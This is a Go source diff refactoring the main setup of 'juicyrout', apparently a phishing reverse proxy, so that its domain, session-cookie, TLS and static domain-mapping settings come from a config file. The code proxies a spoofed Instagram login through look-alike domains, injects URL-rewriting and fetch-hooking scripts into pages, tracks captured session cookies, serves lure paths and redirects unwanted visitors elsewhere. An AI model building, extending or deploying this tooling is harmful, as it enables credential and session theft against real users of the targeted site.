@@ -4,9 +4,11 @@ import (
 	_ "embed"
 	"flag"
 	"fmt"
+	"io/fs"
 	"log"
 	"net"
 	"net/http"
+	"os"
 	"runtime/debug"
 	"time"
 
@@ -23,16 +25,10 @@ var changeURLScript string
 //go:embed js/fetch-hook.js
 var fetchHookScript string
 
-// TODO cli args
-//nolint:funlen
-func main() {
-	var port string
-	flag.StringVar(&port, "p", "8091", "listening port")
-	flag.Parse()
-
+func setupHTTPClient() *http.Client {
 	// DefaultTransport without ForceAttemptHTTP2 (temporarily disable HTTP2)
 	// TODO enable http2 as soon as the bug https://github.com/golang/go/issues/47882 is fixed
-	client := &http.Client{
+	return &http.Client{
 		Transport: &http.Transport{
 			Proxy: http.ProxyFromEnvironment,
 			DialContext: (&net.Dialer{
@@ -45,27 +41,68 @@ func main() {
 			ExpectContinueTimeout: 1 * time.Second,
 		},
 	}
+}
 
-	// TODO static map www.example.com -> mail.com (from config file)
-	conv := NewDomainConverter("host.juicyrout:" + port)
+func setupDomainConverter(conf *appConfig) DomainConverter {
+	conv := NewDomainConverter(conf.DomainNameWithPort)
 	conv.AddStaticMapping("www.w3.org", "www.w3.org")
+	for _, pair := range conf.StaticDomainMappings {
+		conv.AddStaticMapping(pair.Proxy, pair.Target)
+	}
+	return conv
+}
+
+func setupRequestProcessor(conv DomainConverter) RequestProcessor {
 	requestURLProc := newURLRegexProcessor(func(domain string) string {
 		return conv.ToTargetDomain(domain)
 	})
+	return NewRequestProcessor(conv, requestURLProc)
+}
+
+func setupResponseProcessor(conv DomainConverter) ResponseProcessor {
+	htmlProc := newHTMLRegexProcessor(conv, changeURLScript+fetchHookScript)
 	responseURLProc := newURLRegexProcessor(func(domain string) string {
 		return conv.ToProxyDomain(domain)
 	})
-	htmlProc := newHTMLRegexProcessor(conv, changeURLScript+fetchHookScript)
-	req := NewRequestProcessor(conv, requestURLProc)
-	resp := NewResponseProcessor(conv, responseURLProc, htmlProc)
+	return NewResponseProcessor(conv, responseURLProc, htmlProc)
+}
+
+type hostFS struct{}
+
+func (hostFS) Open(name string) (fs.File, error) {
+	return os.Open(name)
+}
+
+//nolint:funlen
+func main() {
+	var configFile, envFile string
+	flag.StringVar(&configFile, "c", "", "yaml config file")
+	flag.StringVar(&envFile, "e", "", "dotenv config file")
+	flag.Parse()
+	if envFile == "" {
+		if _, err := os.Stat(".env"); err == nil {
+			envFile = ".env"
+		}
+	}
+
+	fsys := &hostFS{}
+	conf, err := parseAppConfig(fsys, configFile, envFile)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	client := setupHTTPClient()
+
+	conv := setupDomainConverter(conf)
+	req := setupRequestProcessor(conv)
+	resp := setupResponseProcessor(conv)
 
 	cookieManager := NewCookieManager()
 	storage := NewSessionStorage(memory.New(), cookieManager)
-	// TODO from config file
 	store := session.New(session.Config{
-		Expiration:     30 * time.Minute,
-		KeyLookup:      "cookie:session_id",
-		CookieDomain:   "host.juicyrout",
+		Expiration:     conf.SessionExpiration,
+		KeyLookup:      "cookie:" + conf.SessionCookieName,
+		CookieDomain:   conf.DomainName,
 		CookieSecure:   true,
 		CookieHTTPOnly: true,
 		Storage:        storage,
@@ -85,17 +122,17 @@ func main() {
 		},
 	}))
 	auth := NewAuthMiddleware(AuthConfig{
-		CookieName:     "session_id",
+		CookieName:     conf.SessionCookieName,
 		CookieManager:  cookieManager,
 		Store:          store,
 		InvalidAuthURL: "https://duckduckgo.com",
-		LoginURL:       fmt.Sprintf("https://www-instagram-com.host.juicyrout:%s/", port),
+		LoginURL:       fmt.Sprintf("https://www-instagram-com.%s/", conf.DomainNameWithPort),
 		LureService:    NewStaticLureService([]string{"/abc/def"}),
 	})
 	proxy := NewProxyHandler(client, req, resp)
 
 	api := NewAPIMiddleware(APIConfig{
-		APIHostname:     fmt.Sprintf("api.host.juicyrout:%s", port),
+		APIHostname:     "api." + conf.DomainNameWithPort,
 		DomainConverter: conv,
 	})
 
@@ -114,7 +151,7 @@ func main() {
 	// for CORS preflight requests
 	app.Options("/*", api, proxy)
 
-	if err := app.ListenTLS(":"+port, "cert.pem", "key.pem"); err != nil {
+	if err := app.ListenTLS(conf.ListenAddr, conf.TLSCert, conf.TLSKey); err != nil {
 		log.Println("listen error", err)
 	}
 }
